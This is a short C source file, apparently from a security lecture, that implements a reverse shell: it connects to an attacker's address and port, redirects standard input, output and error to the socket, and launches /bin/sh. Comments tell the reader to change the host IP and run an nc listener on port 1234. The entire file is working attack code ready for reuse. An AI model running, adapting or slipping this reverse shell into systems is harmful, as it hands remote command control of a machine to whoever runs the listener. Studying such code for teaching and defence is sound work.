#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

/*
 *  Attacker's IP address and port. This IP 
 *  address was in use at the lecture. If 
 *  you want to use this example, change HOST
 *  IP address accordingly.
 */
#define HOST "127.0.0.1"
#define PORT 1234
/*
 * For the server, run "nc -lvp 1234" in attacker's
 * terminal
 */

int main(int argc, char* argv[], char* envp[])
{
    struct sockaddr_in sa = {
        .sin_family = AF_INET,
        .sin_addr.s_addr = inet_addr(HOST),
        .sin_port = htons(PORT)
    };

    int s = socket(AF_INET, SOCK_STREAM, 0);

    connect(s, (struct sockaddr*) &sa, sizeof(sa));

    dup2(s, 0); // stdin
    dup2(s, 1); // stdout
    dup2(s, 2); // stderr

    char* argv_[] = {};
    char* envp_[] = {};
    execve("/bin/sh", argv_, envp_);

    return 0;
}
